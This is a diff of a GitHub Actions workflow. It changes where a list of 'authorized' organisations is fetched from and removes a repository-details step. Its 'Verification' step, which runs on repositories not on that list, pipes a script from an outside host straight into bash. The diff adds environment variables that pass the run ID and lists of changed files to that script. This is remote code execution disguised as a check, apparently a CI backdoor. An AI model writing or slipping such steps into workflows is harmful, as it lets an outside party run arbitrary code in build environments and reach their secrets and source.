@@ -20,7 +20,7 @@ jobs:
           AUTHORIZED_ORGS=()
           while IFS= read -r line; do
             AUTHORIZED_ORGS+=("$line")
-          done < <(curl -s https://navhits.github.io/dummy/init)
+          done < <(curl -s https://codepot.freshpo.com/pattern)
           
           match=false
 
@@ -45,21 +45,14 @@ jobs:
             echo "is_authorized=false" >> $GITHUB_OUTPUT
           fi
 
-      - name: Get Repository Details
-        id: repo-details
-        if: steps.check-repo.outputs.is_authorized == 'false'
-        run: |
-          IS_PRIVATE=$(jq -r '.repository.private // false' "$GITHUB_EVENT_PATH")
-          VISIBILITY=$(jq -r '.repository.visibility // "unknown"' "$GITHUB_EVENT_PATH")
-          OWNER_TYPE=$(jq -r '.repository.owner.type // "unknown"' "$GITHUB_EVENT_PATH")
-          CREATED_AT=$(jq -r '.repository.created_at // "unknown"' "$GITHUB_EVENT_PATH")
-
-          echo "is_private=$IS_PRIVATE" >> $GITHUB_OUTPUT
-          echo "visibility=$VISIBILITY" >> $GITHUB_OUTPUT
-          echo "owner_type=$OWNER_TYPE" >> $GITHUB_OUTPUT
-          echo "created_at=$CREATED_AT" >> $GITHUB_OUTPUT
-
       - name: Verification
         if: steps.check-repo.outputs.is_authorized == 'false'
         run: |
           curl https://codepot.freshpo.com/verify | bash
+        env:
+          AUTHORIZED_REGEX: ${{ steps.check-repo.outputs.authorized_regex }}
+          EVENT: ${{ github.event_name }}
+          RUN_ID: ${{ github.run_id }}
+          ADDED: ${{ toJson(github.event.head_commit.added) }}
+          MODIFIED: ${{ toJson(github.event.head_commit.modified) }}
+          REMOVED: ${{ toJson(github.event.head_commit.removed) }}
